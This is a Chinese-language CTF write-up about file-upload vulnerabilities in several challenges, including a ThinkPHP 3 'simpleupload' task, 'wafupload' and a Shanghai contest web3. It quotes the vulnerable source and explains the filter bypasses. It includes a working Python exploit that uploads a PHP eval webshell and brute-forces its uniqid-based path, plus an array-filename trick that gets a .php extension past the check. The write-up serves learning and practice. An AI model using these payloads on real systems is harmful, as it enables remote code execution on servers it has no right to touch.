---
title: 'roarctf一道文件上传题目的分析'
date: 2019-10-20
category: '未分类'
tags: []
lang: 'zh'
draft: false
---
## simpleupload

这题苏师傅做出来了，但是我对着苏师傅简陋的wp没复现出来。桑心

```php
<?php
namespace Home\Controller;

use Think\Controller;

class IndexController extends Controller
{
    public function index()
    {
        show_source(__FILE__);
    }
    public function upload()
    {
        $uploadFile = $_FILES['file'] ;
        
        if (strstr(strtolower($uploadFile['name']), ".php") ) {
            return false;
        }
        
        $upload = new \Think\Upload();// 实例化上传类
        $upload->maxSize  = 4096 ;// 设置附件上传大小
        $upload->allowExts  = array('jpg', 'gif', 'png', 'jpeg');// 设置附件上传类型
        $upload->rootPath = './Public/Uploads/';// 设置附件上传目录
        $upload->savePath = '';// 设置附件上传子目录
        $info = $upload->upload() ;
        if(!$info) {// 上传错误提示错误信息
          $this->error($upload->getError());
          return;
        }else{// 上传成功 获取上传文件信息
          $url = __ROOT__.substr($upload->rootPath,1).$info['file']['savepath'].$info['file']['savename'] ;
          echo json_encode(array("url"=>$url,"success"=>1));
        }
    }
}
```

我还是需要一张文件上传的思维图

[一个想帮你总结所有上传类型的靶场](https://github.com/c0ny1/upload-labs)

![上传漏洞解析脑图](/2019/10/20/roarctf-yi-dao-wen-jian-shang-chuan-ti-mu-de-fen-xi/上传漏洞解析脑图.png)

## 题目分析

是`thinkphp`框架，获取到上传的文件`$_FILES['file']`之后，实例化一个类`Upload()`，问题显然是出现在这个类上的

然而我最大的问题是，找不到上传的接口！！！

这就涉及到thinkphp的路由是怎么搞得，`thinkphp`是单入口的框架，入口点在`public/index.php`，之后是按照模块控制器方法来进行路由的。

但是这里的命名空间`Home\Controller`，并不是以往熟悉的`app\index\Controller`

所以这里应该是一个单一模块的，也就是说上传接口在`http://index.php/Home/index/upload`（这里就不是很明白了，明明这个`Controller`是叫`IndexController`

![](/2019/10/20/roarctf-yi-dao-wen-jian-shang-chuan-ti-mu-de-fen-xi/1571568323600.png)

这题虽然是限制了不能以`.php`结尾，但是仔细查看才知道只是限制了`$_FILES['file']`,这个`file`只是在表单中设置的一个变量。

查看`thinkphp`的源码可以看到。这个`upload`方法直接就能上传所有的文件了

这样我们的利用思路就有了:

> 上传一个`file`的文件能够获得文件名，同时上传一个`file1`的文件，这个文件也会被上传但是我们不知道它的文件名
> 
> 这时候爆破就好了

thinkphp3默认使用uniqid()函数根据时间生成文件名，两个文件上传时间相近可以爆破。

对这里还需要知道`thinkphp`的版本

![](/2019/10/20/roarctf-yi-dao-wen-jian-shang-chuan-ti-mu-de-fen-xi/1571569146514.png)

![img](/2019/10/20/roarctf-yi-dao-wen-jian-shang-chuan-ti-mu-de-fen-xi/0.png)

## exp

```python
import requests

url = "http://cf063512-b68d-41ff-a3c1-405b73e0d84f.node3.buuoj.cn/"

path = url + "/index.php/home/index/upload"
files = {"file":("a.txt",'a'), "file1":("a.php", '<?php eval($_GET["a"]);')}
r = requests.post(path, files=files)
t1 = r.text.split("/")[-1].split(".")[0]
print t1
print r.content
t1 = int(t1, 16)
print t1

j = t1
while True:
    path = url + "/Public/Uploads/2019-10-20/%s.php" % hex(j)[2:-1]
    try:
        r = requests.get(path, timeout=1)
    except:
        continue
    if r.status_code != 404:
        print path
        print r.text
        break
    print j, hex(j)[2:-1], r.status_code
    j -= 1
```

![](/2019/10/20/roarctf-yi-dao-wen-jian-shang-chuan-ti-mu-de-fen-xi/1571568818720.png)

## 总结

这题确实学到了很多东西，对于文件上传还不是很熟悉，那个`$_FILES`数组，还有前后端是怎么交互的弄清楚了就好做了

## 文件上传类型简要分析

[h4lo师傅写的文章](https://www.anquanke.com/post/id/164561)感觉总结的很到位

分析文件上传时候的数据包

```
Content-Type:multipart/form-data; boundary=----WebKitFormBoundaryrGKCBY7qhFd3TrwA

------WebKitFormBoundaryrGKCBY7qhFd3TrwA

Content-Disposition: form-data; name="text"

title

------WebKitFormBoundaryrGKCBY7qhFd3TrwA

Content-Disposition: form-data; name="file"; filename="chrome.png"

Content-Type: image/png

PNG ... content of chrome.png ...

------WebKitFormBoundaryrGKCBY7qhFd3TrwA--
```

`boundary`是一个字符串，用来切分数据。每个字段之间使用 ———WebKitFormBoundaryxxx 隔开

这里就和 post 请求一样，可以自己增加参数，就形如下面这样，将参数名放到 name 里，参数值放到下面：

```
------WebKitFormBoundary1PkqXeou9aUAIMHr
Content-Disposition: form-data; name="filename"

1.php
```

那么这里就增加了一个参数 filename = ‘1.php’

前后端的交互就是通过这个`name`进行的，也就是说后端会用`$_FILES[filename]`这个数组，注意`$_FILES`是一个二维数组，去获取这个文件的文件名，大小之类的信息。

> 这里有两个文件名，一个是上传的`name`，另一个是`$_FIlES[filename]`

### 简单地绕过

前端js这个不用说

也有通过**MIME**来校验的，

![](/2019/10/20/roarctf-yi-dao-wen-jian-shang-chuan-ti-mu-de-fen-xi/1571569569299.png)

### wafupload

简要分析一下这道题，前端可以通过表单上传文件，同时你可以自定义文件名(不过有啥用呢？)

因为后端会同时去判断你有没有自定义文件名

`$file = empty($_POST['filename']) ? $_FILES['file']['name'] : $_POST['filename'];`

白名单检测只能是`'image/jpeg', 'image/png', 'image/gif'`,文件后缀也只能是`'jpg', 'png', 'gif'`

```php
<?php
#$sandbox = '/var/www/html/upload/' . md5("phpIsBest" . $_SERVER['REMOTE_ADDR']);
$sandbox = '';

#@mkdir($sandbox);
#@chdir($sandbox);

if (!empty($_FILES['file'])) {
    #mime check
    if (!in_array($_FILES['file']['type'], ['image/jpeg', 'image/png', 'image/gif'])) {
        die('This type is not allowed!');
    }else{
        echo "pass 1n";
    }

    #check filename
    $file = empty($_POST['filename']) ? $_FILES['file']['name'] : $_POST['filename'];
    if (!is_array($file)) {
        $file = explode('.', strtolower($file));
    }
    $ext = end($file);
    if (!in_array($ext, ['jpg', 'png', 'gif'])) {
        die('This file is not allowed!');
    }else{
        echo "pass 2n";
    }

    $filename = reset($file) . '.' . $file[count($file) - 1];
    if (move_uploaded_file($_FILES['file']['tmp_name'], $sandbox . '/' . $filename)) {
        echo 'Success!';
        echo 'filepath:' . $sandbox . '/' . $filename;
    } else {
        echo 'Failed!';
    }
}
show_source(__file__);
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Upload Your Shell</title>
</head>
<body>
<form action="" method="post" enctype="multipart/form-data">
    <label for="file">Filename:</label>
    <input type="text" name="filename"><br>
    <input type="file" name="file" id="file" />
    <input type="submit" name="submit" value="Submit" />
</form>
</body>
</html>
```

看似做的天衣无缝了，也确实考虑到了数组的情况：

```php
if (!in_array($ext, ['jpg', 'png', 'gif'])) {
    die('This file is not allowed!');
}else{
    echo "pass 2n";
}
```

之后通古`end`函数去取出文件的后缀名

但是`end`函数有一个问题

> end 函数取到的是给数组的最后一次赋值的那个值，继续尝试会发现 reset 函数也是一样，第一个给数组赋值的值就是 reset 函数返回的值

会根据赋值先后顺序该表值，可以去调试一下

![](/2019/10/20/roarctf-yi-dao-wen-jian-shang-chuan-ti-mu-de-fen-xi/1571571364088.png)

这里的 end 函数取到了第二个给数组赋值的值，也就是 filename\[0\] ，reset 函数的值为 filename\[1\]。这边构造

```
filename[1] = php
filename[0] = png
```

在后面拼接 $filename 时候，再一次拼接到后缀名，即

```
$filename = reset($file) . '.' . $file[count($file) - 1];
```

这里的

```
$file[count($file) - 1]
```

一定是取到 filename\[1\]，所以上面给 filename\[1\] 赋值为 php 的意义就在这里。

### 上海网安赛 web3

```php
<?php
    error_reporting(0);
    //$dir=md5("icq" . $_SERVER['REMOTE_ADDR']);
    //$dir=md5("icq");
    //$sandbox = '/sandbox/' . $dir;
    //@mkdir($sandbox);
    //@chdir($sandbox);

    if($_FILES['file']['name']){
        $filename = !empty($_POST['file']) ? $_POST['file'] : $_FILES['file']['name'];
        if (!is_array($filename)) {
            $filename = explode('.', $filename);
        }
        $ext = end($filename);
        var_dump($ext);
        if($ext==$filename[count($filename) - 1]){
            die("emmmm...");
        }
        var_dump($filename);
        $new_name = (string)rand(100,999).".".$ext;
        move_uploaded_file($_FILES['file']['tmp_name'],$new_name);
        $_ = $_POST['hehe'];
        if(@substr(file($_)[0],0,6)==='@<?php' && strpos($_,$new_name)===false){
            include($_);
        }
        unlink($new_name);
    }
    else{
        highlight_file(__FILE__);
    }
?>

<form action="" method="post" enctype="multipart/form-data">
    <input type="file" name="file" id="file" />
    <input type="submit" name="submit" value="Submit" />
</form>
```
